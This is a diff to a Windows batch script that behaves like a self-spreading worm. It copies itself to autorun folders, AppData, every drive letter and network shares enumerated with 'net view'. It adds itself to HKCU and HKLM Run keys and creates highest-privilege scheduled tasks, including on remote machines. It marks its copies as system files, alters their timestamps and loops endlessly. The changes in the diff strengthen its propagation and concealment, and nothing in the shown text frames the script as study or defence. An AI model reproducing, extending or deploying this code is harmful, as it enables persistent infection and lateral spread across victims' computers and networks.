@@ -78,8 +78,16 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 
 
 
+attrib +r +s "%~dpnx0"
 %module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"
-rem attrib +h +r +s "%~dpnx0"
+
+
+
+
+
+
+
+
 
 
 
@@ -98,20 +106,24 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 if exist "%path_autoRun1%\%~nx0" (
-  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
+  copy /y "%~dpnx0" "%path_autoRun1%\"
   attrib +r +s "%path_autoRun1%\%~nx0"
-) else copy /y "%~dpnx0" "%path_autoRun1%\"
+  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
+)
 
-if exist "%path_autoRun2%\%~nx0" (
-  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
+if not exist "%path_autoRun2%\%~nx0" (
+  copy /y "%~dpnx0" "%path_autoRun2%\"
   attrib +r +s "%path_autoRun2%\%~nx0"
-) else copy /y "%~dpnx0" "%path_autoRun2%\"
+  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
+)
 
 
 
 for %%i in (localAppData appData) do (
   if exist "!%%i!\%~nx0" (
+    call attrib +r +s "!%%i!\%~nx0"
     (
+      call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
       call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
       call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
       call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
@@ -120,13 +132,7 @@ for %%i in (localAppData appData) do (
     )>nul 2>nul
   ) else (
     call copy /y "%~dpnx0" "!%%i!\"
-    (
-      if exist "!%%i!\%~nx0" (
-        call attrib -h -r -s "!%%i!\%~nx0"
-        call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
-        rem call attrib +h +r +s "!%%i!\%~nx0"
-      )
-    )>nul 2>nul
+    if exist "!%%i!\%~nx0" call attrib +r +s "!%%i!\%~nx0"
   )
 )
 
@@ -135,14 +141,15 @@ for %%i in (localAppData appData) do (
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
+      attrib +r +s "%%i:\%~nx0"
       (
+        %module_fileTouch% /w /a /c /d %app_date% "%%i:\%~nx0"
         reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%~nx0" /f /rl highest
       )>nul 2>nul
-      rem attrib +h +r +s "%%i:\%~nx0"
 
       if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
@@ -169,13 +176,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       )
     ) else (
       copy /y "%~dpnx0" %%i:\
-      (
-        if exist "%%i:\%~nx0" (
-          attrib -h -r -s "%%i:\%~nx0"
-          %module_fileTouch% /w /a /c /d %app_date% "%%i:\%~nx0"
-          rem attrib +h +r +s "%%i:\%~nx0"
-        )
-      )>nul 2>nul
+      if exist "%%i:\%~nx0" call attrib +r +s "%%i:\%~nx0"
     )
   )
 )
@@ -187,8 +188,11 @@ timeout /nobreak /t 5 >nul
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     if exist "%%i\%%j\%~nx0" (
-      (for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr "%%j:\%~nx0" /f /rl highest)>nul 2>nul
-      rem attrib +h +r +s "%%i\%%j\%~nx0"
+      attrib +r +s "%%i\%%j\%~nx0"
+      (
+        %module_fileTouch% /w /a /c /d %app_date% "%%i\%%j\%~nx0"
+        for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr "%%j:\%~nx0" /f /rl highest
+      )>nul 2>nul
 
       if /i "%%j:" NEQ "C:" (
         for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
@@ -208,19 +212,21 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
       )
     ) else (
       copy /y "%~dpnx0" "%%i\%%j\"
-      (
-        if exist "%%i\%%j\%~nx0" (
-          attrib -h -r -s "%%i\%%j\%~nx0"
-          %module_fileTouch% /w /a /c /d %app_date% "%%i\%%j\%~nx0"
-          rem attrib +h +r +s "%%i\%%j\%~nx0"
-        )
-      )>nul 2>nul
+      if exist "%%i\%%j\%~nx0" attrib +r +s "%%i\%%j\%~nx0"
     )
   )
 )
 
 timeout /nobreak /t 5 >nul
 goto :cycle
+
+
+
+
+
+
+
+
 
 
 
@@ -244,16 +250,18 @@ if exist "%path_autoRun2%\%~nx0" (
 
 
 
-if exist "%path_desktop%\%~nx0" (
-  attrib -h -r -s "%path_desktop%\%~nx0"
-  del /q "%path_desktop%\%~nx0"
-  (
-    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    schtasks /create /sc onstart /tn "%app_name% Desktop" /tr "%path_desktop%\%~nx0" /f /rl highest
-  )>nul 2>nul
+for %%i in (localAppData appData) do (
+  if exist "!%%i!\%~nx0" (
+    call attrib -h -r -s "!%%i!\%~nx0"
+    call del /q "!%%i!\%~nx0"
+    (
+      call reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+      call reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+      call reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+      call reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+      call schtasks /delete /tn "%app_name% %%i" /f
+    )>nul 2>nul
+  )
 )
 
 
